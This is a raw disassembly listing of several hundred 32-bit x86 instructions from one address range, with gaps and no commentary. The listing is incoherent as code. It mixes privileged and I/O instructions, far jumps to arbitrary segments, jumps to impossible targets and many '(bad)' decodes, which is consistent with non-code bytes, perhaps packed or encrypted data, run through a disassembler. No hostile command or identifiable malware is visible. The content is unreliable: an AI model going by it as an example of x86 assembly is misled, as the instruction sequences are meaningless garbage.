  41e2dc:	jmp    0x2855f1a5
  41e2e1:	fxch   st(7)
  41e2e3:	mov    ch,0x64
  41e2e5:	xchg   BYTE PTR [ecx],dh
  41e2e7:	sbb    BYTE PTR [esp+eax*4-0x3e],bl
  41e2eb:	adc    al,0xb3
  41e2ed:	imul   edx,DWORD PTR [eax],0x4c26e745
  41e2f3:	mov    esi,0x22450d9e
  41e2f8:	sub    edi,DWORD PTR ds:0x27598ae8
  41e2fe:	jno    0x41e2cb
  41e300:	sbb    cl,bl
  41e302:	cmp    ecx,DWORD PTR [eax+0x20]
  41e305:	enterw 0x911a,0xe
  41e30a:	xchg   ebp,eax
  41e30b:	push   cs
  41e30c:	clc    
  41e30d:	fmul   st(0),st
  41e30f:	mov    cl,0xe2
  41e311:	xor    DWORD PTR [ecx-0x448174c0],eax
  41e317:	ins    BYTE PTR es:[edi],dx
  41e318:	adc    eax,0x1ea77b23
  41e31d:	jmp    0x95ef:0x70085d41
  41e324:	xchg   DWORD PTR [ebp-0x54],edx
  41e327:	xchg   ecx,eax
  41e328:	out    dx,al
  41e329:	scas   eax,DWORD PTR es:[edi]
  41e32a:	sar    DWORD PTR [eax],1
  41e32c:	pop    edx
  41e32d:	mov    cl,0x9e
  41e32f:	push   ebx
  41e330:	fdivr  DWORD PTR [eax+0x31a4d]
	...
  41e396:	mov    DWORD PTR [edx],edx
  41e398:	ja     0x41e3b9
  41e39a:	(bad)  
  41e39b:	jg     0x41e386
  41e39d:	xchg   esi,eax
  41e39e:	cmp    eax,0xd1204855
  41e3a3:	dec    esp
  41e3a4:	test   bl,dh
  41e3a6:	out    dx,eax
  41e3a7:	aas    
  41e3a8:	add    DWORD PTR [eax],eax
  41e3aa:	pop    es
  41e3ab:	add    DWORD PTR [eax],eax
  41e3ad:	add    BYTE PTR [ebp-0x63],dh
  41e3b0:	add    DWORD PTR [edi+0x375b1130],ecx
  41e3b6:	lea    edx,[ecx]
  41e3b8:	add    eax,0x4be9e501
  41e3bd:	cmp    al,0xc0
  41e3bf:	arpl   WORD PTR [edx-0x31],ax
  41e3c2:	add    ecx,DWORD PTR [eax]
  41e3c4:	and    ebp,DWORD PTR [esi-0x3b]
  41e3c7:	je     0x41e43c
  41e3c9:	rcr    DWORD PTR [ebp-0x41dc673e],0xc8
  41e3d0:	sbb    eax,0x93646082
  41e3d5:	imul   esp,esi,0x5895f5bd
  41e3db:	ret    0xbb08
  41e3de:	das    
  41e3df:	inc    ecx
  41e3e0:	mov    cr7,ecx
  41e3e3:	add    DWORD PTR [esi-0xecc9c7f],ebp
  41e3e9:	sub    DWORD PTR [eax],esi
  41e3eb:	pop    ebx
  41e3ec:	sub    DWORD PTR [ebx],ecx
  41e3ee:	jg     0x41e45f
  41e3f0:	push   edx
  41e3f1:	cmp    al,0x4e
  41e3f3:	lods   al,BYTE PTR ds:[esi]
  41e3f4:	inc    ebp
  41e3f5:	adc    BYTE PTR [ebp-0x467afaee],ch
  41e3fb:	xchg   ecx,eax
  41e3fc:	in     al,0xc3
  41e3fe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e3ff:	(bad)  
  41e400:	pop    ebp
  41e401:	or     edx,DWORD PTR [ebx]
  41e403:	and    dl,cl
  41e405:	pusha  
  41e406:	dec    ebx
  41e407:	cmp    al,0x2e
  41e409:	fnstsw WORD PTR [esi+edx*2]
  41e40c:	outs   dx,BYTE PTR ds:[esi]
  41e40d:	ret    0xa60d
  41e410:	push   ecx
  41e411:	xchg   BYTE PTR [ebx],bh
  41e413:	add    dl,bl
  41e415:	ret    0x68df
  41e418:	stos   BYTE PTR es:[edi],al
  41e419:	add    eax,0xb688b78d
  41e41e:	dec    edx
  41e41f:	enter  0x3f3f,0x82
  41e423:	(bad)  
  41e424:	dec    ebp
  41e425:	xlat   BYTE PTR ds:[ebx]
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	pop    ss
  41e428:	repnz retf 
  41e42a:	call   FWORD PTR [edx+edx*2+0x51]
  41e42e:	dec    ecx
  41e42f:	fcom   QWORD PTR [ecx-0x4361a026]
  41e435:	inc    eax
  41e436:	inc    edi
  41e437:	xchg   edx,eax
  41e438:	mov    al,ah
  41e43a:	(bad)  
  41e43b:	mov    al,0xb4
  41e43d:	sub    esi,edi
  41e43f:	xchg   edx,eax
  41e440:	cmp    cl,BYTE PTR [edx]
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	dec    ebx
  41e444:	and    bl,dl
  41e446:	inc    edi
  41e447:	test   al,0x24
  41e449:	mov    edi,0x9093626b
  41e44e:	sub    ah,0x41
  41e451:	js     0x41e3df
  41e453:	nop
  41e454:	ins    BYTE PTR es:[edi],dx
  41e455:	add    BYTE PTR [ebx+esi*4+0xd602a02],0xb5
  41e45d:	cmp    bl,BYTE PTR [ebx+0x1cd41d31]
  41e463:	jae    0x41e40f
  41e465:	mov    DWORD PTR [edx+0x4a5c85ae],0xfc85af18
  41e46f:	in     eax,0x4d
  41e471:	icebp  
  41e472:	in     eax,dx
  41e473:	jo     0x41e421
  41e475:	mov    ds:0x162c1af7,eax
  41e47a:	jge    0x41e4d1
  41e47c:	ret    0x2dca
  41e47f:	clc    
  41e480:	sbb    ch,BYTE PTR [eax]
  41e482:	xchg   edi,eax
  41e483:	mov    DWORD PTR [eax+ebx*1+0x6eaf39c],0x7e8fe1b0
  41e48e:	das    
  41e48f:	sbb    esp,DWORD PTR [esi+0x76]
  41e492:	repnz pushf 
  41e494:	pushf  
  41e495:	ins    BYTE PTR es:[edi],dx
  41e496:	fidiv  WORD PTR [edx-0x6977e8b5]
  41e49c:	jns    0x41e458
  41e49e:	out    dx,eax
  41e49f:	push   ss
  41e4a0:	cs mov ch,0x5b
  41e4a3:	lahf   
  41e4a4:	(bad)  
  41e4a5:	icebp  
  41e4a6:	push   ecx
  41e4a7:	aaa    
  41e4a8:	xor    ch,BYTE PTR [edx+0x56]
  41e4ab:	and    ch,bh
  41e4ad:	ret    0x4fab
  41e4b0:	mov    WORD PTR [ebp+0x61],ds
  41e4b3:	pop    DWORD PTR ss:[eax]
	...
  41e516:	and    BYTE PTR [edx-0x35],ch
  41e519:	dec    ebx
  41e51a:	retf   
  41e51b:	jmp    0x41e4bd
  41e51d:	imul   ecx,DWORD PTR [edi+0x51],0xffffff9a
  41e521:	push   ss
  41e522:	rol    DWORD PTR [bp+si],cl
  41e525:	push   edx
  41e526:	test   BYTE PTR [eax+0x1],0x0
  41e52a:	pop    es
  41e52b:	add    DWORD PTR [eax],eax
  41e52d:	add    BYTE PTR [edi+eiz*8+0x7b90f020],ah
  41e534:	mov    al,ds:0xb4cda3e4
  41e539:	mov    ds:0x943873a3,al
  41e53e:	leave  
  41e53f:	sub    ebp,DWORD PTR [edi+0xa]
  41e542:	(bad)  [ecx-0x7ffed49c]
  41e548:	rol    BYTE PTR [ecx+edi*4],1
  41e54b:	aad    0x9c
  41e54d:	fistp  WORD PTR [ecx+0x44be7f22]
  41e553:	test   BYTE PTR [ecx+ecx*2],bl
  41e556:	int3   
  41e557:	pop    ebp
  41e558:	ret    
  41e559:	ins    BYTE PTR es:[edi],dx
  41e55a:	push   cs
  41e55b:	daa    
  41e55c:	daa    
  41e55d:	cmp    BYTE PTR [edx-0x37],ch
  41e560:	inc    edi
  41e561:	and    al,0x44
  41e563:	arpl   si,dx
  41e565:	push   edx
  41e566:	inc    ebx
  41e567:	sbb    bh,BYTE PTR [ecx+0x11]
  41e56a:	jnp    0x41e548
  41e56c:	fs push ebp
  41e56e:	pop    ss
  41e56f:	imul   eax,DWORD PTR [eax+0x31],0x25
  41e573:	mov    ds:0xe00d3565,al
  41e578:	or     eax,0x6550b7ea
  41e57d:	cmp    al,0x30
  41e57f:	pop    esi
  41e580:	aam    0xbc
  41e582:	or     edi,eax
  41e584:	imul   eax,DWORD PTR [ebx+esi*2],0x78cbc9b5
  41e58b:	xor    bl,BYTE PTR [ebp-0x540ac896]
  41e591:	add    al,BYTE PTR [edi-0x4e]
  41e594:	push   eax
  41e595:	push   ds
  41e596:	ds stos DWORD PTR es:[edi],eax
  41e598:	xor    eax,DWORD PTR [edi+0x7dba1a4f]
  41e59e:	dec    edx
  41e59f:	jmp    0x85491a91
  41e5a4:	mov    ah,0x9f
  41e5a6:	jae    0x41e5a9
  41e5a8:	popa   
  41e5a9:	mov    al,ds:0x47d59279
  41e5ae:	adc    esi,DWORD PTR [esi]
  41e5b0:	mov    al,0x58
  41e5b2:	stos   DWORD PTR es:[edi],eax
  41e5b3:	pushf  
  41e5b4:	test   DWORD PTR [ecx-0x444b3bb1],eax
  41e5ba:	(bad)  
  41e5bb:	imul   edx,esi,0x1f86d711
  41e5c1:	aam    0xa5
  41e5c3:	cs mov eax,0x6476a032
  41e5c9:	shr    ebp,1
  41e5cb:	imul   ebp,DWORD PTR [esi-0x7c],0xe1d88966
  41e5d2:	test   BYTE PTR [ebp-0x1b],dh
  41e5d5:	mov    ds:0xfcea27f8,al
  41e5da:	fs xchg esp,eax
  41e5dc:	cmp    eax,0x70bb38e7
  41e5e1:	mov    esp,0x6cec31f7
  41e5e6:	push   ds
  41e5e7:	pop    eax
  41e5e8:	sbb    esi,DWORD PTR [ebp+0x6e]
  41e5eb:	test   BYTE PTR [edx-0x41],ah
  41e5ee:	stc    
  41e5ef:	mov    ah,0x49
  41e5f1:	in     eax,0x81
  41e5f3:	fcomp  st(5)
  41e5f5:	cs out 0x45,al
  41e5f8:	test   BYTE PTR [edx-0x565a7d80],ch
  41e5fe:	sub    al,0x3b
  41e600:	sub    eax,0xa70826af
  41e605:	pop    ebp
  41e606:	out    0x4b,al
  41e608:	jae    0x41e651
  41e60a:	es loop 0x41e61b
  41e60d:	add    eax,DWORD PTR [eax-0x512e3beb]
  41e613:	xor    BYTE PTR [edx+0x5f],dh
  41e616:	xchg   ecx,eax
  41e617:	bound  edi,QWORD PTR [ebx]
  41e619:	cvtps2pi mm5,QWORD PTR [esi-0x57]
  41e61d:	jge    0x41e69a
  41e61f:	sbb    BYTE PTR [esi+0x3767d910],al
  41e625:	pop    ecx
  41e626:	sbb    eax,0x2b47d4b1
  41e62b:	cmovg  ebp,DWORD PTR [ecx-0x779837cd]
  41e632:	push   ebx
  41e633:	cwde   
  41e634:	inc    edx
	...
  41e695:	add    ch,al
  41e697:	cwde   
  41e698:	loope  0x41e6ef
  41e69a:	std    
  41e69b:	jge    0x41e692
  41e69d:	cwde   
  41e69e:	xchg   edx,eax
  41e69f:	fmul   st(5),st
  41e6a1:	mov    ds:0xcca26329,al
  41e6a6:	std    
  41e6a7:	inc    ecx
  41e6a8:	add    DWORD PTR [eax],eax
  41e6aa:	pop    es
  41e6ab:	add    DWORD PTR [eax],eax
  41e6ad:	add    BYTE PTR [eax],dl
  41e6af:	mov    WORD PTR [edx-0x3],?
  41e6b2:	outs   dx,DWORD PTR ds:[esi]
  41e6b3:	aad    0x46
  41e6b5:	add    ebx,DWORD PTR [ebp+0x5c]
  41e6b8:	sbb    al,0x41
  41e6ba:	jle    0x41e6a7
  41e6bc:	out    dx,al
  41e6bd:	dec    eax
  41e6be:	mov    eax,0x193b9576
  41e6c3:	inc    esi
  41e6c4:	jp     0x41e664
  41e6c6:	nop
  41e6c7:	mov    ah,0x3e
  41e6c9:	xor    dh,BYTE PTR [esi-0x75d4edb2]
  41e6cf:	stc    
  41e6d0:	dec    eax
  41e6d1:	call   0x6816:0xa2aecd90
  41e6d8:	hlt    
  41e6d9:	mov    edi,DWORD PTR [edx-0x41844060]
  41e6df:	pop    ebp
  41e6e0:	pop    ecx
  41e6e1:	repz cmc 
  41e6e3:	xchg   bh,al
  41e6e5:	or     al,0x53
  41e6e7:	rcr    BYTE PTR [ecx+0x3b],cl
  41e6ea:	push   eax
  41e6eb:	scas   al,BYTE PTR es:[edi]
  41e6ec:	ror    BYTE PTR [ebx-0x2829fa46],cl
  41e6f2:	stc    
  41e6f3:	dec    ebx
  41e6f4:	add    dh,al
  41e6f6:	cmc    
  41e6f7:	test   eax,0xc6f6f86a
  41e6fc:	add    ebp,DWORD PTR [ecx]
  41e6fe:	pop    edi
  41e6ff:	popf   
  41e700:	push   0xffffffd8
  41e702:	mov    ebp,0xb81e73b1
  41e707:	cli    
  41e708:	inc    esp
  41e709:	mov    BYTE PTR [ebx],cl
  41e70b:	inc    esi
  41e70c:	jbe    0x41e71d
  41e70e:	in     eax,0x12
  41e710:	cmp    al,0xe2
  41e712:	jnp    0x41e6e3
  41e714:	and    DWORD PTR [edi],edi
  41e716:	call   0x3e6efe62
  41e71b:	std    
  41e71c:	hlt    
  41e71d:	and    ch,cl
  41e71f:	dec    esi
  41e720:	test   ebp,0x3325e4d5
  41e726:	xor    ebx,DWORD PTR [eax+0x14]
  41e729:	inc    eax
  41e72a:	and    DWORD PTR [ebx+0xd],ebx
  41e72d:	ss ret 0x13ab
  41e731:	(bad)  
  41e733:	inc    edx
  41e734:	xor    al,0x74
  41e736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e737:	loopne 0x41e74e
  41e739:	lods   al,BYTE PTR ds:[esi]
  41e73a:	mov    esi,0x2a0c1b1c
  41e73f:	jecxz  0x41e70f
  41e741:	add    eax,0x8211079f
  41e746:	xchg   edi,eax
  41e747:	and    eax,0x4ac7254f
  41e74c:	mov    BYTE PTR [eax],ch
  41e74e:	push   edi
  41e74f:	xchg   edi,eax
  41e750:	or     al,0x3c
  41e752:	cmc    
  41e753:	adc    ch,ch
  41e755:	aaa    
  41e756:	add    eax,0xca3353ef
  41e75b:	clc    
  41e75c:	xor    edx,edx
  41e75e:	iret   
  41e75f:	in     al,dx
  41e760:	aas    
  41e761:	mov    cl,BYTE PTR [ebp+0x60]
  41e764:	adc    BYTE PTR [ebx],dh
  41e766:	fwait
  41e767:	mov    eax,0x7e816e29
  41e76c:	es nop
  41e76e:	sbb    DWORD PTR [ebp+edx*1+0x15e60894],esi
  41e775:	stc    
  41e776:	jmp    0x41e785
  41e778:	pop    esi
  41e779:	cdq    
  41e77a:	sub    al,BYTE PTR ds:0x4b68288d
  41e780:	fsubr  st(4),st
  41e782:	int    0x47
  41e784:	add    BYTE PTR [esi-0x35],0x5a
  41e788:	ss daa 
  41e78a:	arpl   WORD PTR [eax+0x12],cx
  41e78d:	dec    ebx
  41e78e:	xchg   esi,eax
  41e78f:	cs ffreep st(4)
  41e792:	or     al,0xa6
  41e794:	mov    ecx,0x86efe1a3
  41e799:	arpl   WORD PTR ds:0x76860c0b,ax
  41e79f:	jg     0x41e7b1
  41e7a1:	call   0x294a:0x5203cbd
  41e7a8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  41e7aa:	imul   edx,DWORD PTR [ebx+0x1d10f2],0x99892cde
  41e7b4:	jmp    0x0:0x0
	...
  41e813:	add    BYTE PTR [eax],al
  41e815:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e81b:	(bad)  
  41e81c:	(bad)  
  41e81d:	jns    0x41e875
  41e81f:	imul   ebx,DWORD PTR [esi+eiz*2],0xfffffff5
  41e823:	mov    edx,0x43041172
  41e828:	add    DWORD PTR [eax],eax
  41e82a:	pop    es
  41e82b:	add    DWORD PTR [eax],eax
  41e82d:	add    bh,dl
  41e82f:	mov    BYTE PTR [ebp+ecx*1-0x76],ch
  41e833:	loopne 0x41e878
  41e835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e836:	imul   edx,edi,0xd5c30042
  41e83c:	das    
  41e83d:	mov    ds:0x2209e3e8,eax
  41e842:	xchg   ecx,eax
  41e843:	lds    esp,FWORD PTR [esi-0x4f]
  41e846:	test   BYTE PTR [ebx],al
  41e848:	mov    ?,WORD PTR [ebp-0x3ea23a56]
  41e84e:	inc    eax
  41e84f:	shr    DWORD PTR [edx-0x20b8c1d9],cl
  41e855:	xor    eax,0xebfe76d8
  41e85a:	mov    ds:0xd931222f,al
  41e85f:	je     0x41e869
  41e861:	fwait
  41e862:	cmp    DWORD PTR [esi+edi*4],0x27
  41e866:	adc    DWORD PTR [esi+0x48],0x17
  41e86a:	cmp    BYTE PTR [ebx],bh
  41e86c:	loopne 0x41e8cb
  41e86e:	loop   0x41e842
  41e870:	imul   esp,DWORD PTR [ebx+0x18],0x7ac811fc
  41e877:	push   ds
  41e878:	sub    al,0xe3
  41e87a:	addr16 mov eax,ds:0xf7bc
  41e87e:	xchg   ebx,eax
  41e87f:	sub    al,BYTE PTR [eax+eiz*4-0x33]
  41e883:	add    al,0x29
  41e885:	dec    ebp
  41e886:	push   edx
  41e887:	adc    eax,DWORD PTR [edi+0x38]
  41e88a:	xlat   BYTE PTR ds:[ebx]
  41e88b:	dec    esp
  41e88c:	adc    eax,0x7d6023c0
  41e891:	pop    edx
  41e892:	pop    ss
  41e893:	cmp    cl,BYTE PTR [edx-0x4c]
  41e896:	pop    ss
  41e897:	jecxz  0x41e8d2
  41e899:	shr    DWORD PTR [ebx-0x3a],0xc8
  41e89d:	bound  eax,QWORD PTR [esi]
  41e89f:	or     ecx,ebp
  41e8a1:	not    ebp
  41e8a3:	sbb    DWORD PTR [esi+0x36d1903e],edx
  41e8a9:	inc    ecx
  41e8aa:	int    0x5f
  41e8ac:	push   esp
  41e8ad:	push   edx
  41e8ae:	and    edx,esi
  41e8b0:	inc    edx
  41e8b1:	add    BYTE PTR [eax+edx*8],ch
  41e8b4:	mov    cl,0xa0
  41e8b6:	add    eax,0x7baa3a37
  41e8bb:	scas   eax,DWORD PTR es:[edi]
  41e8bc:	jp     0x41e8df
  41e8be:	and    edx,DWORD PTR [eax-0x1a]
  41e8c1:	and    eax,0x911bfea7
  41e8c6:	test   al,0x94
  41e8c8:	stos   BYTE PTR es:[edi],al
  41e8c9:	jo     0x41e907
  41e8cb:	in     eax,dx
  41e8cc:	or     eax,0x8fcd8a4e
  41e8d1:	ret    
  41e8d2:	shl    DWORD PTR [edi+0x791f57d1],0x5e
  41e8d9:	shr    BYTE PTR [eax],cl
  41e8db:	sbb    BYTE PTR ds:0xd6984f6c,al
  41e8e1:	xor    ebp,edx
  41e8e3:	sbb    al,BYTE PTR [eax+eax*2-0x1ed7775d]
  41e8ea:	push   ss
  41e8eb:	adc    dh,ah
  41e8ed:	lods   al,BYTE PTR ds:[esi]
  41e8ee:	into   
  41e8ef:	adc    edi,esp
  41e8f1:	pop    ss
  41e8f2:	inc    edi
  41e8f3:	pop    esp
  41e8f4:	push   esp
  41e8f5:	pop    DWORD PTR [ebp-0x322c0b82]
  41e8fb:	cmc    
  41e8fc:	data16 scas al,BYTE PTR es:[edi]
  41e8fe:	push   ebx
  41e8ff:	rol    DWORD PTR ds:0xfe298907,0x33
  41e906:	test   eax,0x6ecbf27e
  41e90b:	mov    eax,0x97baf94b
  41e910:	mov    edx,gs
  41e912:	pop    edi
  41e913:	out    0x95,eax
  41e915:	jne    0x41e94f
  41e917:	scas   al,BYTE PTR es:[edi]
  41e918:	call   DWORD PTR [edi-0x19]
  41e91b:	xchg   BYTE PTR [edi+0x7faae1d9],dl
  41e921:	mov    cs,WORD PTR [edx]
  41e923:	ret    
  41e924:	fdivr  DWORD PTR [ecx-0x40]
  41e927:	pop    ebp
  41e928:	outs   dx,BYTE PTR ds:[esi]
  41e929:	lods   al,BYTE PTR ds:[esi]
  41e92a:	sar    BYTE PTR [ebx],1
  41e92c:	data16 jae 0x41e990
  41e92f:	push   ds
  41e930:	stc    
  41e931:	add    bh,BYTE PTR [ebp+0x59]
  41e934:	sbb    eax,DWORD PTR [eax]
	...
  41e996:	js     0x41e995
  41e998:	ret    0xc766
  41e99b:	jg     0x41e999
  41e99d:	(bad)  
  41e99e:	jmp    0x41e94c
  41e9a0:	repnz xchg ecx,eax
  41e9a2:	sti    
  41e9a3:	xchg   ah,ah
  41e9a5:	jp     0x41e9b2
  41e9a7:	inc    esp
  41e9a8:	add    DWORD PTR [eax],eax
  41e9aa:	pop    es
  41e9ab:	add    DWORD PTR [eax],eax
  41e9ad:	add    BYTE PTR [ebx-0x7],bl
  41e9b0:	mov    BYTE PTR [edx],ah
  41e9b2:	loopne 0x41e957
  41e9b4:	xor    al,0x73
  41e9b6:	hlt    
  41e9b7:	iret   
  41e9b8:	jbe    0x41ea0d
  41e9ba:	dec    ebx
  41e9bb:	sbb    ebx,DWORD PTR [ecx+0x9a19619]
  41e9c1:	jbe    0x41e977
  41e9c3:	je     0x41e9b5
  41e9c5:	inc    ecx
  41e9c6:	into   
  41e9c7:	sbb    DWORD PTR ds:0x8e65d70a,edx
  41e9cd:	les    ebp,FWORD PTR [edi+0x63]
  41e9d0:	add    al,BYTE PTR [ebp+0x26d6ad6c]
  41e9d6:	mov    edi,0x9cdf7c69
  41e9db:	outs   dx,BYTE PTR ds:[esi]
  41e9dc:	call   0x7a5c:0xb310112
  41e9e3:	mov    ecx,0xef03e9ac
  41e9e8:	(bad)  
  41e9e9:	and    dx,dx
  41e9ec:	imul   ecx,esi,0xf75cc7cd
  41e9f2:	arpl   cx,di
  41e9f4:	jge    0x41e97f
  41e9f6:	aad    0x47
  41e9f8:	push   0x484cf24f
  41e9fd:	sbb    al,BYTE PTR [eax+0x21]
  41ea00:	int3   
  41ea01:	cld    
  41ea02:	(bad)  
  41ea03:	fld    TBYTE PTR [edx]
  41ea05:	mov    ds:0x171e3451,eax
  41ea0a:	arpl   WORD PTR [esi+0x19f2d95e],sp
  41ea10:	xor    ebp,esi
  41ea12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea13:	and    bh,BYTE PTR [esi+0x1f]
  41ea16:	call   0xf228:0x19ab6d22
  41ea1d:	cmp    eax,0x2dba33d8
  41ea22:	ret    0x837
  41ea25:	aam    0x56
  41ea27:	loope  0x41ea98
  41ea29:	xchg   edi,eax
  41ea2a:	pop    ecx
  41ea2b:	loope  0x41ea02
  41ea2d:	rdtsc  
  41ea2f:	test   BYTE PTR [edx+0x2656e81a],cl
  41ea35:	retf   0xe41e
  41ea38:	in     al,0x45
  41ea3a:	les    ebp,FWORD PTR [esi]
  41ea3c:	nop
  41ea3d:	sub    esi,DWORD PTR [si-0x475e]
  41ea42:	xchg   esp,eax
  41ea43:	cmp    bl,BYTE PTR [ebx]
  41ea45:	shl    DWORD PTR [edx+0x73],cl
  41ea48:	xchg   ebx,eax
  41ea49:	pop    ebp
  41ea4a:	fwait
  41ea4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea4c:	xor    DWORD PTR [ecx],ebx
  41ea4e:	push   0xffffffd6
  41ea50:	mov    eax,0x8317cb5d
  41ea55:	push   0xffffffee
  41ea57:	cmc    
  41ea58:	xchg   ecx,eax
  41ea59:	dec    edx
  41ea5a:	cmc    
  41ea5b:	jns    0x41ea94
  41ea5d:	lea    ecx,[ecx+0x5f]
  41ea60:	jae    0x41ea98
  41ea62:	in     eax,0x37
  41ea64:	or     dl,BYTE PTR [ebx]
  41ea66:	add    DWORD PTR [esi+0x1],edi
  41ea69:	mov    al,0x2d
  41ea6b:	int    0x9c
  41ea6d:	and    al,0xc
  41ea6f:	(bad)  
  41ea72:	in     eax,0xd
  41ea74:	enter  0xa907,0xb4
  41ea78:	xlat   BYTE PTR ds:[ebx]
  41ea79:	aad    0x6d
  41ea7b:	jne    0x41ea8a
  41ea7d:	push   0xa68a286b
  41ea82:	gs push eax
  41ea84:	test   al,0xfb
  41ea86:	int3   
  41ea87:	xchg   esp,eax
  41ea88:	cmp    dl,bh
  41ea8a:	lock push eax
  41ea8c:	sbb    esi,edi
  41ea8e:	mov    ah,0x58
  41ea90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea91:	fadd   DWORD PTR ds:0x72e95f27
  41ea97:	sbb    esi,DWORD PTR [edx-0x14]
  41ea9a:	sti    
  41ea9b:	shl    DWORD PTR [ebp-0x79],cl
  41ea9e:	xchg   DWORD PTR [ebx-0x3b3d0ca8],eax
  41eaa4:	mov    ds:0x2bc62b1c,al
  41eaa9:	in     eax,dx
  41eaaa:	mov    db0,esp
  41eaad:	pop    es
  41eaae:	mul    DWORD PTR [esi]
  41eab0:	std    
  41eab1:	inc    edi
  41eab2:	inc    BYTE PTR [ebx+0xc9]
	...
  41eb14:	add    BYTE PTR [eax],al
  41eb16:	adc    ch,BYTE PTR [edi]
  41eb18:	mov    esi,DWORD PTR [edi+edi*4+0x22af3fb4]
  41eb1f:	and    ebp,DWORD PTR [eax]
  41eb21:	fnstcw WORD PTR [edi+0x12f6df9a]
  41eb27:	inc    ebp
  41eb28:	add    DWORD PTR [eax],eax
  41eb2a:	pop    es
  41eb2b:	add    DWORD PTR [eax],eax
  41eb2d:	add    bl,ah
  41eb2f:	mov    dh,0x30
  41eb31:	mov    bh,0xdd
  41eb33:	and    ch,BYTE PTR [ecx-0x39]
  41eb36:	int3   
  41eb37:	adc    eax,0xa8f7370e
  41eb3c:	js     0x41eaca
  41eb3e:	jbe    0x41eb56
  41eb40:	add    eax,0x1df21717
  41eb45:	xor    eax,0x9e22f35
  41eb4a:	adc    cl,BYTE PTR [edi+0x5863c104]
  41eb50:	push   edx
  41eb51:	lods   al,BYTE PTR ds:[esi]
  41eb52:	pop    edx
  41eb53:	push   ecx
  41eb54:	inc    eax
  41eb55:	dec    esp
  41eb56:	out    dx,al
  41eb57:	mov    BYTE PTR [eax+0x64484b9a],ch
  41eb5d:	add    DWORD PTR [edx+0x2cc6410],esp
  41eb63:	(bad)  
  41eb64:	mov    esp,0x59274bb3
  41eb69:	fwait
  41eb6a:	push   ss
  41eb6b:	(bad)  
  41eb6c:	in     eax,0x1b
  41eb6e:	or     edi,eax
  41eb70:	shl    DWORD PTR [eax],1
  41eb72:	in     al,0xe
  41eb74:	scas   al,BYTE PTR es:[edi]
  41eb75:	push   ebx
  41eb76:	rol    esi,1
  41eb78:	retf   0xfbb3
  41eb7b:	stc    
  41eb7c:	mov    ds:0xa0b4e2fa,eax
  41eb81:	out    0xd7,al
  41eb83:	inc    esi
  41eb84:	inc    edx
  41eb85:	cmp    DWORD PTR [eax+0x34],ecx
  41eb88:	shr    DWORD PTR [edx-0x3ff50de9],0xe8
  41eb8f:	mov    al,ds:0x8da4a268
  41eb94:	mov    BYTE PTR [edi+eax*1+0x26d55bc7],al
  41eb9b:	or     DWORD PTR [esp+esi*1],ecx
  41eb9e:	sub    al,0x52
  41eba0:	fwait
  41eba1:	ret    
  41eba2:	mov    DWORD PTR [edi],ebp
  41eba4:	add    BYTE PTR [esi],0xfe
  41eba7:	daa    
  41eba8:	xchg   ebp,eax
  41eba9:	push   ss
  41ebaa:	icebp  
  41ebab:	jg     0x41ebe5
  41ebad:	lods   al,BYTE PTR ds:[esi]
  41ebae:	sahf   
  41ebaf:	mov    ah,0xc0
  41ebb1:	(bad)  
  41ebb2:	sbb    eax,0xc6770c6f
  41ebb7:	cwde   
  41ebb8:	pop    ds
  41ebb9:	xchg   esp,eax
  41ebba:	pop    ss
  41ebbb:	xor    dh,BYTE PTR [ebx]
  41ebbd:	das    
  41ebbe:	adc    eax,0x435c9e68
  41ebc3:	jmp    0xdfc4b694
  41ebc8:	and    DWORD PTR [edi-0x1ffea496],edi
  41ebce:	jge    0x41eb99
  41ebd0:	dec    ecx
  41ebd1:	hlt    
  41ebd2:	dec    ecx
  41ebd3:	or     al,0x94
  41ebd5:	stos   DWORD PTR es:[edi],eax
  41ebd6:	push   0x41
  41ebd8:	adc    DWORD PTR [esi],ebp
  41ebda:	mov    eax,DWORD PTR ds:0xb070a2cc
  41ebe0:	pop    ecx
  41ebe1:	inc    eax
  41ebe2:	(bad)  
  41ebe3:	icebp  
  41ebe4:	add    BYTE PTR [eax+0x21a50687],al
  41ebea:	lea    eax,[ecx+0x54e8adac]
  41ebf0:	in     al,dx
  41ebf1:	mov    ecx,edi
  41ebf3:	scas   eax,DWORD PTR es:[edi]
  41ebf4:	mov    eax,0x54fc6bb4
  41ebf9:	cld    
  41ebfa:	sbb    dh,BYTE PTR [eax]
  41ebfc:	push   ebx
  41ebfd:	mov    al,ds:0x2a543a36
  41ec02:	jns    0x41ec1f
  41ec04:	(bad)  
  41ec05:	out    dx,al
  41ec06:	ret    
  41ec07:	into   
  41ec08:	adc    eax,0x66581dc7
  41ec0d:	pop    ds
  41ec0e:	adc    ch,BYTE PTR [eax+0x21e6aff3]
  41ec14:	push   esp
  41ec15:	pop    ss
  41ec16:	loopne 0x41ec42
  41ec18:	sub    esi,eax
  41ec1a:	cdq    
  41ec1b:	push   ebx
  41ec1c:	cmp    ch,BYTE PTR ds:0x1fd5
  41ec22:	into   
  41ec23:	sub    al,0x21
  41ec25:	fs push eax
  41ec27:	mov    bh,0x26
  41ec29:	iret   
  41ec2a:	push   ecx
  41ec2b:	das    
  41ec2c:	push   cs
  41ec2d:	inc    edx
  41ec2e:	inc    edi
  41ec2f:	stos   BYTE PTR es:[edi],al
  41ec30:	lods   al,BYTE PTR ds:[esi]
  41ec31:	lods   eax,DWORD PTR ds:[esi]
  41ec32:	jbe    0x41ebd0
  41ec34:	pop    edx
	...
  41ec95:	add    BYTE PTR [ecx-0xf],al
  41ec98:	(bad)
  41ec9b:	hlt    
  41ec9c:	gs icebp 
  41ec9e:	adc    ebx,edi
  41eca0:	ficom  WORD PTR [ecx]
  41eca2:	je     0x41ec9d
  41eca4:	push   edi
  41eca5:	pop    es
  41eca6:	sbb    DWORD PTR [esi+0x1],eax
  41eca9:	add    BYTE PTR [edi],al
  41ecab:	add    DWORD PTR [eax],eax
  41ecad:	add    BYTE PTR [esi],dh
  41ecaf:	cmp    ch,cl
  41ecb1:	out    0x74,eax
  41ecb3:	in     al,0x37
  41ecb5:	sbb    ah,ch
  41ecb7:	mov    ebp,0x4328fc44
